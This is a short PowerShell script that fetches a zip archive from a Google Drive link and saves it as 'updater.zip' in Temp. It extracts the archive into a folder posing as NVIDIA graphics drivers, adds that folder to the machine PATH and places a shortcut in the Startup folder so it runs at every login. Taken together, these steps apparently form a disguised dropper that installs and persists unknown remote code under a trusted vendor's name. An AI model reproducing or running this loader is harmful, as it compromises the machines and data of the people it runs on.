$username=[Environment]::UserName
$zipFile = "https://drive.usercontent.google.com/download?id=19ynD0Kgp6YOhS3tNBtifwlJcSt7tZs1G&export=download&authuser=0&confirm=t&uuid=0fcc1b59-a0cc-48ca-bda8-b0aa58304f86&at=APZUnTVoCPGdefBZwQY_3Mk2EB7-:1722089561472"
$op = "C:\Users\$username\AppData\Local\Temp\updater.zip"
$cmd1 = "curl `"$zipFile`" --output `"$op`""
cmd /c $cmd1
Expand-Archive "C:\Users\$username\AppData\Local\Temp\updater.zip" -DestinationPath "C:\Program Files\NVIDIA Graphics Drivers"
$Path = [Environment]::GetEnvironmentVariable("PATH", "Machine")+';C:\Program Files\NVIDIA Graphics Drivers\bin;C:\Program Files\NVIDIA Graphics Drivers\include'
[Environment]::SetEnvironmentVariable( "Path", $Path, "Machine" )
cp "C:\Program Files\NVIDIA Graphics Drivers\Nvidia Driver.lnk" "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
